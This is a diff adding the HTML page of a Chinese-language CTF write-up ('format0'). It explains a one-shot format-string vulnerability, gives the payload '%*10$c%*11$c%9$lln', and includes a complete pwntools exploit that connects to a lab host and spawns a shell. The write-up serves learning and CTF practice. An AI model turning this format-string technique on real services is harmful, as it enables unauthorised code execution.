@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>format0 | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先我们检查保护机制：
+我们可以看到有canary，可以修改got表。
+这里我们第一反应应该是采用泄露canary和修改got表的办法。
+但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
+由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
+然后我们进入IDA查看这个文件：
+我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
+因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
+我们到GDB中调试查看一下程序具体的流程：
+在memset函数这里初始化了两个栈空间：
+然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
+然后程序让我们输入v2字符串，放到栈空间中去：
+然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
+程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
+%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
+x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
+而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
+payload = b&#39;%*10$c%*11$c%9$lln&#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
+完整的exp为：
+from pwn import *#context.log_level = &#39;debug&#39;#p = process(&#39;./format0&#39;)p = remote(&#39;10.0.25.109&#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&#39;your name:&#39;)payload = b&#39;%*10$c%*11$c%9$lln&#39;p.sendline(payload)p.recvuntil(&#39;you shell...&#39;)p.sendline(&#39;a&#39;)p.interactive() ">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/format0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="format0" />
+<meta property="og:description" content="首先我们检查保护机制：
+我们可以看到有canary，可以修改got表。
+这里我们第一反应应该是采用泄露canary和修改got表的办法。
+但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
+由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
+然后我们进入IDA查看这个文件：
+我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
+因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
+我们到GDB中调试查看一下程序具体的流程：
+在memset函数这里初始化了两个栈空间：
+然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
+然后程序让我们输入v2字符串，放到栈空间中去：
+然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
+程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
+%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
+x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
+而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
+payload = b&#39;%*10$c%*11$c%9$lln&#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
+完整的exp为：
+from pwn import *#context.log_level = &#39;debug&#39;#p = process(&#39;./format0&#39;)p = remote(&#39;10.0.25.109&#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&#39;your name:&#39;)payload = b&#39;%*10$c%*11$c%9$lln&#39;p.sendline(payload)p.recvuntil(&#39;you shell...&#39;)p.sendline(&#39;a&#39;)p.interactive() " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/format0/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="format0"/>
+<meta name="twitter:description" content="首先我们检查保护机制：
+我们可以看到有canary，可以修改got表。
+这里我们第一反应应该是采用泄露canary和修改got表的办法。
+但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
+由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
+然后我们进入IDA查看这个文件：
+我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
+因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
+我们到GDB中调试查看一下程序具体的流程：
+在memset函数这里初始化了两个栈空间：
+然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
+然后程序让我们输入v2字符串，放到栈空间中去：
+然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
+程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
+%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
+x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
+而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
+payload = b&#39;%*10$c%*11$c%9$lln&#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
+完整的exp为：
+from pwn import *#context.log_level = &#39;debug&#39;#p = process(&#39;./format0&#39;)p = remote(&#39;10.0.25.109&#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&#39;your name:&#39;)payload = b&#39;%*10$c%*11$c%9$lln&#39;p.sendline(payload)p.recvuntil(&#39;you shell...&#39;)p.sendline(&#39;a&#39;)p.interactive() "/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "format0",
+      "item": "https://jellyfish-pro.github.io/ctf/format0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "format0",
+  "name": "format0",
+  "description": "首先我们检查保护机制：\n我们可以看到有canary，可以修改got表。\n这里我们第一反应应该是采用泄露canary和修改got表的办法。\n但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。\n由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。\n然后我们进入IDA查看这个文件：\n我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。\n因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。\n我们到GDB中调试查看一下程序具体的流程：\n在memset函数这里初始化了两个栈空间：\n然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中\n然后程序让我们输入v2字符串，放到栈空间中去：\n然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：\n程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号\n%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。\nx %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中\n而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：\npayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址\n完整的exp为：\nfrom pwn import *\r#context.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;./format0\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20000)\rif args.G:\rgdb.attach(p)\rp.recvuntil(\u0026#39;your name:\u0026#39;)\rpayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39;\rp.sendline(payload)\rp.recvuntil(\u0026#39;you shell...\u0026#39;)\rp.sendline(\u0026#39;a\u0026#39;)\rp.interactive() ",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先我们检查保护机制：\n我们可以看到有canary，可以修改got表。\n这里我们第一反应应该是采用泄露canary和修改got表的办法。\n但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。\n由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。\n然后我们进入IDA查看这个文件：\n我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。\n因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。\n我们到GDB中调试查看一下程序具体的流程：\n在memset函数这里初始化了两个栈空间：\n然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中\n然后程序让我们输入v2字符串，放到栈空间中去：\n然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：\n程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号\n%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。\nx %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中\n而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：\npayload = b'%*10$c%*11$c%9$lln' 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址\n完整的exp为：\nfrom pwn import *\r#context.log_level = 'debug'\r#p = process('./format0')\rp = remote('10.0.25.109',20000)\rif args.G:\rgdb.attach(p)\rp.recvuntil('your name:')\rpayload = b'%*10$c%*11$c%9$lln'\rp.sendline(payload)\rp.recvuntil('you shell...')\rp.sendline('a')\rp.interactive() ",
+  "wordCount" : "50",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/format0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      format0
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先我们检查保护机制：</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426135947493.png" alt="image-20220426135947493"  />
+</p>
+<p>我们可以看到有canary，可以修改got表。</p>
+<p>这里我们第一反应应该是采用泄露canary和修改got表的办法。</p>
+<p>但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426140412164.png" alt="image-20220426140412164"  />
+</p>
+<p>由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。</p>
+<p>然后我们进入IDA查看这个文件：</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141145917.png" alt="image-20220426141145917"  />
+</p>
+<p>我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。</p>
+<p>因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。</p>
+<p>我们到GDB中调试查看一下程序具体的流程：</p>
+<p>在memset函数这里初始化了两个栈空间：</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141619040.png" alt="image-20220426141619040"  />
+</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141657018.png" alt="image-20220426141657018"  />
+</p>
+<p>然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141841314.png" alt="image-20220426141841314"  />
+</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141854028.png" alt="image-20220426141854028"  />
+</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141904736.png" alt="image-20220426141904736"  />
+</p>
+<p>然后程序让我们输入v2字符串，放到栈空间中去：</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426141948385.png" alt="image-20220426141948385"  />
+</p>
+<p>然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：</p>
+<p><img loading="lazy" src="/ctf/format0.img/image-20220426142119673.png" alt="image-20220426142119673"  />
+</p>
+<p>程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号</p>
+<pre tabindex="0"><code>%*k$c%x$n
+</code></pre><p>%*k$c的含义就是：输出格式化字符串第k个变量个字符。</p>
+<p>x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中</p>
+<p>而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：</p>
+<pre tabindex="0"><code>payload = b&#39;%*10$c%*11$c%9$lln&#39;
+</code></pre><p>这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址</p>
+<p>完整的exp为：</p>
+<pre tabindex="0"><code>from pwn import *
+#context.log_level = &#39;debug&#39;
+
+#p = process(&#39;./format0&#39;)
+p = remote(&#39;10.0.25.109&#39;,20000)
+
+if args.G:
+	gdb.attach(p)
+
+p.recvuntil(&#39;your name:&#39;)
+
+payload = b&#39;%*10$c%*11$c%9$lln&#39;
+
+p.sendline(payload)
+
+p.recvuntil(&#39;you shell...&#39;)
+
+p.sendline(&#39;a&#39;)
+
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/format0.img/image-20220426143300562.png" alt="image-20220426143300562"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/enumcanary/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>enumcanary</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/format1/">
+    <span class="title">Next »</span>
+    <br>
+    <span>format1</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
